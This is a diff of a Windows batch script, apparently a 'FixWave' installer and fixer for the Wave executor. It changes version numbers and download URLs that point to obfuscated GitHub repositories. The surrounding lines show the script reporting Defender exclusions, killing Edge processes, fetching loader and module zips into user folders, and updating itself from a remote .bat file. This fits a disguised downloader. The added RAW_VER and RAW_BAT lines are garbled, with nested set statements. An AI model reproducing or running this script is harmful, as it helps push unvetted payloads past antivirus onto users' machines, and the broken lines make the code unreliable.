@@ -5,9 +5,9 @@ setlocal EnableExtensions EnableDelayedExpansion
 ::
 ::  Unauthorized copying, modification, or redistribution
 ::  of this script, in whole or in part, is strictly prohibited.
-set "CURRENT_VER=2.3.6"
-set "RAW_VER=https://raw.githubusercontent.com/delgta5killermoder-web/2-d5x72mP4hh3g47935U9WE382-4-4r-8eE9B3/main/version.txt"
-set "RAW_BAT=https://raw.githubusercontent.com/delgta5killermoder-web/2-d5x72mP4hh3g47935U9WE382-4-4r-8eE9B3/main/FixWave.bat"
+set "CURRENT_VER=2.3.5"
+set "RAW_VER=set "RAW_VER=https://raw.githubusercontent.com/delgta5killermoder-web/2-d5x72mP4hh3g47935U9WE382-4-4r-8eE9B3/main/version.txt""
+set "RAW_BAT=set "RAW_BAT=https://raw.githubusercontent.com/delgta5killermoder-web/2-d5x72mP4hh3g47935U9WE382-4-4r-8eE9B3/main/FixWave.bat""
 for /f "delims=" %%D in ('powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"') do set "DESKTOP=%%D"
 set "NEWFILE=%DESKTOP%\FixWave.bat"
 set "LATEST_VER="
@@ -277,7 +277,7 @@ echo [+] Defender exclusions applied.
 echo.
 echo [*] Fixing Wave Module...
 echo.
-set "MODULE_URL=https://github.com/delgta5killermoder-web/2-d5x72mP4hh3g47935U9WE382-4-4r-8eE9B3/releases/download/8586Z49y6483m28%23vZU38973/48459mg9M9.H.2M64.aN2MA43252b.4.Yae.zip"
+set "MODULE_URL=https://github.com/delgta5killermoder-web/4324y32gv4y32gt432f4432432rew/releases/download/383B723464wjKaRm7fV58Ud7%26775t/48459mg9M9H2M64aN2MA432524Yae.zip"
 set "ZIP_NAME=Wave_Module.zip"
 set "DEST_DIR=%LOCALAPPDATA%"
 set "WAVE_DIR=%DEST_DIR%\Wave"
@@ -417,7 +417,7 @@ taskkill /f /im msedgewebview2.exe >nul 2>&1
 taskkill /f /im msedge.exe >nul 2>&1
 timeout /t 2 >nul
 set "WAVE_LOADER_DIR=%LOCALAPPDATA%\wave"
-set "ZIP_URL=https://github.com/delgta5killermoder-web/2-d5x72mP4hh3g47935U9WE382-4-4r-8eE9B3/releases/download/8586Z49y6483m28%23vZU38973/6A7292tM.236.9.6cUS7942.dv7Y64.zip"
+set "ZIP_URL=https://github.com/delgta5killermoder-web/4324y32gv4y32gt432f4432432rew/releases/download/383B723464wjKaRm7fV58Ud7%26775t/6A7292tM23696cUS7942dv7Y64.zip"
 set "ZIP_PATH=%TEMP%\Loader.zip"
 if not exist "%WAVE_LOADER_DIR%" mkdir "%WAVE_LOADER_DIR%"
 echo [*] Downloading Loader.zip...
@@ -759,5 +759,3 @@ echo.
 echo Saved in C:\WaveSetup\Boot
 pause
 goto mainmenu
-
-
